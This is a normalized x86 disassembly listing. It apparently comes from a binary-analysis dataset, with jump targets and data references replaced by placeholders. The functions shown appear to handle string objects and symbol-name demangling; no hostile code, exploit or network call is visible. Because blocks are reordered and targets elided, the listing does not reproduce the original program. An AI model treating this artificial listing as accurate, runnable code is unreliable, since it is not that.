retn 0x8
sub ebx ecx
mov al [ ebx + ecx ]
mov [ ecx ] al
inc ecx
sub edi 0x1
jne r-xdata
jmp r-xdata
sub_410b2c
push ebp
mov ebp esp
push esi
mov esi ecx
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
and [ esi + 0x4 ] 0xffff00ff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x1
lea eax [ ebp + 0x8 ]
push eax
call sub_411f34
sub_410b58
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
mov [ esi + 0x4 ] bl
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] ebx
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov [ esi + 0x4 ] 0x3
push ebx
push 0x8
mov ecx rw-data
call sub_413d8f
test eax eax
je r-xdata
mov [ esi ] ebx
test ebx ebx
jne r-xdata
push [ ebp + 0x8 ]
mov ecx eax
call sub_410a61
mov ebx eax
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
sub_410ba1
push ebp
mov ebp esp
push esi
mov esi ecx
xor eax eax
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x4 ] al
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] eax
cmp [ ecx ] al
je r-xdata
push eax
push ecx
mov ecx esi
call sub_411f34
mov eax esi
pop esi
pop ebp
retn 0x4
inc eax
cmp [ eax + ecx ] 0x0
jne r-xdata
sub_410bd3
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0xffff00ff
mov [ esi + 0x4 ] al
cmp eax 0x1
jne r-xdata
and [ esi ] 0x0
push eax
call sub_4163e5
mov [ esi ] eax
pop ecx
test eax eax
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov [ esi + 0x4 ] 0x3
jmp r-xdata
sub_410c08
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
cmp edx 0x9
ja r-xdata
push 0x3
cmp [ ecx ] 0xffffffff
je r-xdata
push 0x2
jmp r-xdata
cmp edx [ ecx ]
jg r-xdata
mov ecx [ ebp + 0x8 ]
call sub_41085d
mov eax [ ebp + 0x8 ]
mov edx [ ecx + edx * 4 + 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx ]
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
pop ebp
retn 0x8
sub_410c44
push ebp
mov ebp esp
sub esp 0x20
mov ecx [ ebp - 0xc ]
mov eax 0xffff0000
and [ ebp - 0x4 ] eax
and ecx eax
mov eax [ rw-data ]
xor edx edx
mov [ ebp - 0x8 ] edx
push esi
mov esi 0x1000
test eax eax
je r-xdata
cmp cl 0x3
jne r-xdata
cmp [ eax ] 0x3f
jne r-xdata
cmp cl 0x2
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_413085
pop ecx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov al [ eax + 0x1 ]
cmp al 0x40
jne r-xdata
push [ rw-data ]
lea ecx [ ebp - 0x8 ]
call sub_410ba1
test [ rw-data ] esi
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x24
jne r-xdata
add [ rw-data ] 0x2
lea eax [ ebp - 0x18 ]
push eax
call sub_413085
pop ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
lea ecx [ ebp - 0x20 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
jmp r-xdata
push [ rw-data ]
lea ecx [ ebp - 0x8 ]
push eax
call sub_414f5f
mov eax [ rw-data ]
mov ecx eax
jmp r-xdata
lea ecx [ ebp - 0x8 ]
call sub_416363
mov esi [ rw-data ]
inc eax
mov [ rw-data ] eax
mov ecx esi
add eax 0x7
and eax 0xfffffff8
push eax
call j_sub_40d468
call esi
mov [ rw-data ] eax
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
cmp al 0x3f
jne r-xdata
push edx
lea eax [ ebp - 0x20 ]
push eax
call sub_41577a
pop ecx
pop ecx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
cmp cl 0x2
je r-xdata
mov dl [ eax ]
test dl dl
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x40
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
test [ rw-data ] esi
jne r-xdata
cmp dl 0x20
jne r-xdata
mov al dl
mov [ ecx ] al
mov eax [ rw-data ]
and ecx 0xffff0002
or ecx 0x2
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov [ ecx ] dl
inc ecx
inc eax
inc eax
mov [ ecx ] dl
inc ecx
jmp r-xdata
cmp [ eax ] 0x20
je r-xdata
inc eax
jmp r-xdata
sub_410dbf
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_4107aa
mov ecx eax
call sub_410e2b
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_410de3
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_410823
mov ecx eax
call sub_410e2b
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_410e07
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41085d
mov ecx eax
call sub_410e2b
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_410e2b
push ebp
mov ebp esp
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] edx
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx esi
call sub_410ed5
mov eax esi
pop esi
pop ebp
retn 0x8
sub_410e4d
push ebp
mov ebp esp
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] edx
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx esi
call sub_410f18
mov eax esi
pop esi
pop ebp
retn 0x8
sub_410e6f
push ebp
mov ebp esp
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] edx
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx esi
call sub_410f68
mov eax esi
pop esi
pop ebp
retn 0x8
sub_410e91
push ebp
mov ebp esp
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] edx
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx esi
call sub_410fcd
mov eax esi
pop esi
pop ebp
retn 0x8
sub_410eb3
push ebp
mov ebp esp
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] edx
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx esi
call sub_41102e
mov eax esi
pop esi
pop ebp
retn 0x8
sub_410ed5
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x1
jg r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0x0
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
movsx eax [ ecx + 0x4 ]
mov ecx esi
push eax
call sub_41102e
jmp r-xdata
push [ ecx ]
mov ecx esi
call sub_411147
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
sub_410f18
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x1
jg r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push ebx
mov ebx [ ebp + 0x8 ]
test bl bl
je r-xdata
pop ebx
cmp [ esi ] 0x0
jne r-xdata
push 0x0
push 0x8
mov ecx rw-data
call sub_413d8f
test eax eax
je r-xdata
push ebx
call sub_410b2c
jmp r-xdata
xor eax eax
mov [ eax ] r--data
mov [ eax + 0x4 ] bl
jmp r-xdata
push eax
mov ecx esi
call sub_411147
sub_410f68
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x1
jg r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
pop edi
push ebx
xor ebx ebx
cmp [ esi ] ebx
jne r-xdata
mov al [ edi + 0x4 ]
test al al
je r-xdata
push edi
call sub_410b58
jmp r-xdata
push ebx
push 0x8
mov ecx rw-data
call sub_413d8f
test eax eax
je r-xdata
cmp al 0x1
je r-xdata
pop ebx
push ebx
mov ecx esi
call sub_411147
push edi
mov ecx eax
call sub_410a61
mov ebx eax
movsx eax al
push eax
call sub_41102e
jmp r-xdata
sub_410fcd
push ebp
mov ebp esp
push ebx
mov ebx ecx
cmp [ ebx + 0x4 ] 0x1
jg r-xdata
mov eax ebx
pop ebx
pop ebp
retn 0x4
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
pop edi
cmp [ edi ] 0x0
je r-xdata
push esi
xor esi esi
cmp [ ebx ] esi
jne r-xdata
push esi
push 0xc
mov ecx rw-data
call sub_413d8f
test eax eax
je r-xdata
push edi
call sub_410ba1
jmp r-xdata
push esi
mov ecx ebx
call sub_411147
cmp [ edi ] 0x0
je r-xdata
pop esi
push esi
push edi
mov ecx eax
call sub_410aa8
mov esi eax
inc esi
cmp [ esi + edi ] 0x0
jne r-xdata
sub_41102e
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x1
jg r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi ] 0x0
mov eax [ ebp + 0x8 ]
je r-xdata
push eax
call sub_410bd3
cmp eax 0x2
je r-xdata
cmp eax 0x3
je r-xdata
test eax eax
je r-xdata
push eax
call sub_4163e5
pop ecx
push eax
mov ecx esi
call sub_411147
jmp r-xdata
sub_41106e
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi ] 0x9
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x0
je r-xdata
pop edi
push 0x0
push 0x8
mov ecx rw-data
call sub_413d8f
mov edx eax
test edx edx
je r-xdata
xor edx edx
mov ecx [ edi ]
mov [ edx ] ecx
mov ecx [ edi + 0x4 ]
mov [ edx + 0x4 ] ecx
jmp r-xdata
inc [ esi ]
mov eax [ esi ]
mov [ esi + eax * 4 + 0x4 ] edx
test edx edx
je r-xdata
sub_4110f1
push edi
mov edi ecx
cmp [ edi + 0x4 ] 0x0
je r-xdata
pop edi
retn
mov eax [ edi + 0x8 ]
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
push esi
mov eax [ edi + 0xc ]
mov esi [ edi + 0x4 ]
mov ecx esi
push [ edi + 0xc ]
mov eax [ eax ]
mov [ edi + 0x8 ] eax
call j_sub_40d468
call esi
mov eax [ edi + 0x8 ]
mov [ edi + 0xc ] eax
pop ecx
test eax eax
jne r-xdata
pop esi
sub_411147
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
je r-xdata
mov [ esi + 0x4 ] 0x3
push 0x0
push 0x10
mov ecx rw-data
call sub_413d8f
test eax eax
je r-xdata
xor eax eax
mov ecx [ esi ]
or [ eax + 0xc ] 0xffffffff
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
mov [ esi ] eax
test eax eax
jne r-xdata
sub_41118d
push ebp
mov ebp esp
sub esp 0x64
and [ ebp - 0x30 ] 0xffff0000
xor eax eax
push ebx
push esi
mov [ ebp - 0xc ] eax
mov [ ebp - 0x34 ] eax
call sub_415994
mov esi [ ebp + 0xc ]
mov ebx eax
xor eax eax
xor ecx ecx
inc eax
cmp [ esi ] ecx
je r-xdata
mov [ ebp - 0x1c ] ecx
test [ esi + 0x4 ] 0x200
mov [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx 0xfffe
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_41085d
cmp ebx 0xffff
jne r-xdata
cmp ebx 0xfffd
jne r-xdata
push esi
push eax
push [ ebp + 0x8 ]
call sub_410e07
add esp 0xc
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edi ebx
and edi 0x8000
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
push esi
lea ecx [ ebp - 0x34 ]
call sub_410ed5
mov ecx 0x7c00
test edi edi
jne r-xdata
mov eax ebx
xor edx edx
and eax 0x1800
cmp eax 0x800
mov [ ebp - 0x28 ] eax
mov eax ebx
sete dl
mov [ ebp - 0x10 ] edx
test edx edx
je r-xdata
mov eax ebx
and eax 0xfc00
cmp eax ecx
jne r-xdata
mov eax ebx
and eax ecx
cmp eax 0x6800
je r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
mov eax ebx
mov esi 0x1800
test edi edi
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
push [ ebp + 0x8 ]
call sub_415ee4
lea eax [ ebp - 0x34 ]
push eax
push [ ebp + 0x8 ]
call sub_415f3a
jmp r-xdata
test edi edi
jne r-xdata
mov eax ebx
test edx edx
je r-xdata
mov eax ebx
and eax 0x1b00
cmp eax 0x1000
je r-xdata
test eax eax
je r-xdata
and eax 0x6000
and eax esi
sub eax 0x800
jmp r-xdata
pop edi
pop ecx
pop ecx
mov eax ebx
and eax ecx
cmp eax 0x7000
jne r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
and eax edx
and eax 0x400
jmp r-xdata
neg eax
mov edx 0x1000
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
test edi edi
jne r-xdata
test ebx 0x4000
je r-xdata
mov eax ebx
and eax 0x1b00
cmp eax 0x1100
je r-xdata
test eax eax
je r-xdata
mov eax ebx
test edi edi
je r-xdata
mov eax ebx
mov ecx edi
and eax 0x1b00
sub eax edx
neg eax
sbb eax eax
inc eax
neg ecx
sbb ecx ecx
test eax ecx
je r-xdata
test eax eax
je r-xdata
mov eax ebx
and eax ecx
cmp eax 0x6000
jne r-xdata
mov eax ebx
test edx edx
je r-xdata
mov eax [ rw-data ]
mov ecx eax
shr ecx 0x3
shr eax 0x1
not ecx
not eax
and ecx eax
test cl 0x1
je r-xdata
cmp eax 0x1200
je r-xdata
and eax 0x6000
and eax esi
sub eax 0x800
jmp r-xdata
push r--data
jmp r-xdata
xor esi esi
lea eax [ ebp - 0x44 ]
push esi
push eax
call sub_4132d1
mov eax [ ebp - 0x34 ]
pop ecx
pop ecx
mov [ ebp - 0x54 ] eax
lea ecx [ ebp - 0x54 ]
mov eax [ ebp - 0x30 ]
push 0x7b
mov [ ebp - 0x50 ] eax
call sub_410f18
mov eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x44 ]
push eax
call sub_410ed5
push r--data
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x4c ]
call sub_410e91
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_4123fe
pop ecx
push eax
lea ecx [ ebp - 0x34 ]
call sub_4110b8
lea eax [ ebp - 0x4c ]
push eax
call sub_4123fe
pop ecx
push eax
lea eax [ ebp - 0x54 ]
push eax
push 0x20
lea ecx [ ebp - 0x44 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
and eax edx
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_410fcd
mov eax [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x40 ] 0xffff0000
mov eax 0xffff0000
and [ ebp - 0x48 ] eax
and [ ebp - 0x50 ] eax
and [ ebp - 0x38 ] eax
mov eax [ ebp - 0x50 ]
and eax 0xffff0000
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x28 ] eax
mov eax ebx
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x44 ] ecx
test edx edx
je r-xdata
cmp [ ebp - 0x28 ] 0x1800
jne r-xdata
test eax eax
je r-xdata
mov edx [ ebp - 0x10 ]
xor ecx ecx
mov eax ebx
test edi edi
je r-xdata
mov eax ebx
mov ecx edi
and eax 0x1b00
sub eax 0x1100
neg eax
sbb eax eax
inc eax
neg ecx
sbb ecx ecx
test eax ecx
je r-xdata
test eax eax
je r-xdata
mov eax ebx
and eax 0x6000
mov eax ebx
and eax esi
sub eax 0x800
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
push ecx
lea eax [ ebp - 0x54 ]
push eax
call sub_4132d1
pop ecx
pop ecx
lea eax [ ebp - 0x54 ]
mov ecx esi
push eax
lea eax [ ebp - 0x4c ]
push eax
push 0x7b
lea eax [ ebp - 0x44 ]
push eax
call sub_410e4d
mov ecx eax
call sub_410e2b
push eax
lea ecx [ ebp - 0x34 ]
call sub_410ed5
lea eax [ ebp - 0x54 ]
push eax
call sub_415e94
mov esi 0x1000
pop ecx
test [ rw-data ] esi
jne r-xdata
and eax 0x6000
and eax esi
sub eax 0x800
jmp r-xdata
push r--data
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
test eax eax
je r-xdata
push r--data
lea ecx [ ebp - 0x34 ]
call sub_410fcd
lea eax [ ebp - 0x54 ]
push eax
call sub_412896
mov edx [ rw-data ]
mov eax edx
pop ecx
mov ecx edx
shr eax 0x1
shr ecx 0x4
not eax
not ecx
and ecx eax
test cl 0x1
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push 0x2c
lea ecx [ ebp - 0x44 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x4c ]
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x48 ]
push r--data
mov [ ebp - 0x50 ] eax
call sub_410fcd
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_410ed5
and eax edx
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x64 ]
push eax
call sub_41383a
pop ecx
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] eax
mov edx ebx
xor eax eax
and edx 0x1b00
mov ecx edi
cmp edx 0x1100
sete al
neg ecx
sbb ecx ecx
test eax ecx
jne r-xdata
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov eax ecx
shr eax 0x1
not eax
test al 0x1
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x200
je r-xdata
lea eax [ ebp - 0x2c ]
push 0x1
push eax
call sub_4132d1
mov eax [ ebp - 0x2c ]
mov edx [ ebp - 0x10 ]
pop ecx
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x28 ]
pop ecx
mov [ ebp - 0x28 ] eax
mov eax ebx
and eax 0x700
cmp eax 0x600
jne r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
test esi edx
jne r-xdata
test edi edi
jne r-xdata
mov eax ebx
mov ecx edi
and eax 0x1b00
sub eax 0x1200
neg eax
sbb eax eax
inc eax
neg ecx
sbb ecx ecx
test eax ecx
je r-xdata
test eax eax
je r-xdata
and eax 0x6000
and eax esi
sub eax 0x800
jmp r-xdata
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov ecx edi
cmp edx 0x1200
sete al
neg ecx
sbb ecx ecx
test eax ecx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
call sub_412896
pop ecx
push eax
lea ecx [ ebp - 0x34 ]
call sub_4110b8
shr ecx 0x4
not ecx
test cl 0x1
je r-xdata
mov eax [ rw-data ]
and eax 0x60
cmp al 0x60
lea eax [ ebp - 0x18 ]
push eax
je r-xdata
test edx edx
je r-xdata
lea eax [ ebp - 0x2c ]
push 0x1
push eax
call sub_4132d1
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x2c ]
push 0x1
push eax
call sub_4132d1
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x2c ]
push 0x1
push eax
call sub_4132d1
add esp 0x18
jmp r-xdata
mov eax ebx
mov esi 0x1800
test edi edi
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push 0x20
lea ecx [ ebp - 0x44 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x4c ]
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x48 ]
push 0x20
mov [ ebp - 0x50 ] eax
call sub_410f18
mov eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x34 ]
push eax
call sub_410ed5
mov ecx [ ebp - 0x4c ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x48 ]
jmp r-xdata
mov eax ebx
and eax 0x7c00
cmp eax 0x7800
jne r-xdata
push r--data
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ rw-data ]
shr eax 0x9
not eax
test al 0x1
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov eax [ ebp - 0x50 ]
and eax 0xffff0000
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] eax
push ecx
je r-xdata
cmp [ ebp - 0x34 ] ecx
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call sub_412896
pop ecx
mov ecx eax
call sub_410e2b
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] eax
jmp r-xdata
call sub_4158d0
pop ecx
push eax
lea ecx [ ebp - 0x44 ]
call sub_4110b8
call sub_4158d0
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] eax
jmp r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x500
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x30 ] ecx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x34 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
and eax 0x6000
and eax esi
sub eax 0x800
jmp r-xdata
mov eax [ rw-data ]
shr eax 0x7
not eax
test al 0x1
je r-xdata
mov eax ebx
test edi edi
je r-xdata
push 0x8
mov ecx rw-data
call sub_413d8f
mov ecx eax
mov [ ebp - 0x14 ] ecx
test ecx ecx
je r-xdata
lea eax [ ebp - 0x5c ]
push eax
call sub_4149c7
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x20 ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_410823
mov ecx eax
call sub_410e2b
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_410ed5
test [ rw-data ] 0x1000
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0x34 ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0x30 ] eax
test [ rw-data ] 0x1000
jne r-xdata
xor ecx ecx
cmp [ esi ] ecx
je r-xdata
lea eax [ ebp - 0x2c ]
push 0x1
push eax
call sub_4132d1
pop ecx
pop ecx
and eax 0x1000
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
mov eax ebx
mov edx 0x800
test edi edi
je r-xdata
and eax 0x6000
and eax esi
sub eax 0x800
jmp r-xdata
xor esi esi
mov ecx esi
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ecx + 0x4 ] al
and [ ecx + 0x4 ] 0xffff00ff
mov [ ecx ] eax
jmp r-xdata
xor esi esi
push esi
lea eax [ ebp - 0x18 ]
push eax
push 0x20
lea ecx [ ebp - 0x8 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_410ed5
xor ecx ecx
jmp r-xdata
test ebx 0x10000
je r-xdata
test [ rw-data ] 0x1000
jne r-xdata
test eax eax
je r-xdata
and eax 0x6000
and eax esi
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov eax ebx
test ecx ecx
je r-xdata
push ecx
lea eax [ ebp - 0x64 ]
push eax
call sub_4149c7
pop ecx
pop ecx
mov esi [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] edx
mov eax ebx
test edi edi
je r-xdata
test edi edi
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov eax ebx
mov edx 0x6000
and eax edx
mov ecx 0x800
mov eax ebx
and eax 0x700
cmp eax 0x100
je r-xdata
xor eax eax
inc eax
mov eax ebx
and eax 0x700
sub eax 0x200
neg eax
sbb eax eax
inc eax
jmp r-xdata
lea eax [ ebp - 0x64 ]
push eax
call sub_41211c
pop ecx
push eax
lea eax [ ebp - 0x4c ]
push eax
push 0x28
lea ecx [ ebp - 0x5c ]
call sub_4107aa
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x4c ]
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x48 ]
push 0x29
mov [ ebp - 0x50 ] eax
call sub_410f18
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_410ed5
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
test ecx ecx
je r-xdata
test eax eax
je r-xdata
and eax 0x6000
and eax esi
sub eax edx
jmp r-xdata
mov ecx ebx
and ecx esi
sub ecx edx
neg ecx
sbb ecx ecx
inc ecx
mov eax ebx
xor ecx ecx
and al 0xc0
cmp al 0x40
sete cl
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x54 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x30 ] eax
test edi edi
